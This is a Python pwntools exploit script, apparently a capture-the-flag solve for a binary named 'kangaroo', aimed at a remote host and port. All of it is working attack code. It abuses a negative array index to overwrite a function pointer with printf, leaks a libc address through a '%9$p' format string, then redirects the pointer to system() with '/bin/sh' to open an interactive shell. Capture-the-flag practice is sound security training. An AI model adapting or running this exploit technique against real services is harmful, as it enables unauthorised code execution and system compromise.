from pwn import *

elf = ELF("./kangaroo")
libc = ELF("./libc.so.6")

context.arch = 'amd64'

p = remote("34.170.146.252", 64357)

def read(index, message):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Message: ", message)

def write(index):
    p.sendlineafter(b"> ",b"2")
    p.sendlineafter(b"Index; ", str(index).encode())
    p.recvuntil(b"Message: ")

def clear():
    p.sendlineafter(b"> ", b"3")

printf_plt_addr = elf.plt['printf']
log.info(hex(printf_plt_addr))
fn_clear_index = -1024819115206086193

libc_leak_payload = b"a"*0x8 + p64(printf_plt_addr)
read(fn_clear_index, libc_leak_payload)
read(0, b"%9$p")
clear()

p.recvuntil(b"0x")
libc_init_first_offset = libc.symbols['__libc_init_first']
libc.address = int(p.recvuntil(b"a"), 16) - libc_init_first_offset - 138
log.info(hex(libc.address))

system_addr = libc.symbols['system']
shell_payload = b"a"*0x8 + p64(system_addr)
read(fn_clear_index, shell_payload)
read(0, b"/bin/sh")
clear()

p.interactive()
